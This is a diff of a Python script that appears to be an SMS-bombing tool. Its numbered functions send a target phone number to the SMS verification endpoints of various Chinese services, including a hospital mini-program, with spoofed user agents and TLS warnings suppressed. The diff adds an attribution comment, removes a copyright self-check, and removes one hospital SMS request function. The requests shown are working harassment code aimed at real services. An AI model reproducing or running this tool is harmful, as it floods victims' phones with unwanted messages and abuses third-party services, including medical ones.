@@ -1,11 +1,15 @@
+#出自@zhoukang123
+# -*- coding: utf-8 -*-
 import requests
 import random
 import time
 import base64
 import urllib3
+
+# 禁用安全警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
+# 下面直接开始你的函数定义...
 def generate_random_user_agent():
     android_versions = ['12', '13', '14', '15']
     devices = ['V2403A', 'V2404A', 'V2238A', 'V2324A', 'V2364A']
@@ -1956,35 +1960,7 @@ def 短信6(phone):
     }
     requests.get(url, headers=headers)
 
-import sys
-import os
 
-def strict_check_copyright():
-    current_file = __file__
-    
-    try:
-        with open(current_file, 'r', encoding='utf-8') as f:
-        
-            lines = []
-            for i, line in enumerate(f):
-                if i >= 10:  
-                    break
-                lines.append(line)
-            content = ''.join(lines)
-        
-     
-        if '#出自@zhoukang123' not in content:
-     
-            print("请在文件开头保留注释:#出自@zhoukang123")
-            print("如需转发,请尊重原作者劳动成果!")
-            sys.exit(1)
-            
-        print("版权检查通过")
-        
-    except Exception as e:
-        print(f"检查文件时出错: {e}")
-        sys.exit(1)
-strict_check_copyright()
 def 短信7(phone):
     url = "https://www.101s.com.cn/prod-api/memorial_hall/user/send"
     headers = {
@@ -5614,25 +5590,3 @@ def send_request21(phone):
     except:
         return False
 
-def send_request22(phone):
-    """发送武汉协和医院短信验证码请求"""
-    url = 'https://beta.whsry.net/Sms/send'
-    headers = {
-        'Host': 'beta.whsry.net',
-        'Connection': 'keep-alive',
-        'charset': 'utf-8',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.2 QQ/9.2.5.28755 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
-        'content-type': 'application/json',
-        'Accept-Encoding': 'gzip,compress,br,deflate',
-        'Referer': 'https://servicewechat.com/wx77f1337dcb688776/35/page-frame.html'
-    }
-    data = {
-        "phone": phone,
-        "type": 5,
-        "country_code": "+86"
-    }
-    try:
-        requests.post(url, headers=headers, json=data, timeout=10)
-        return True
-    except:
-        return False
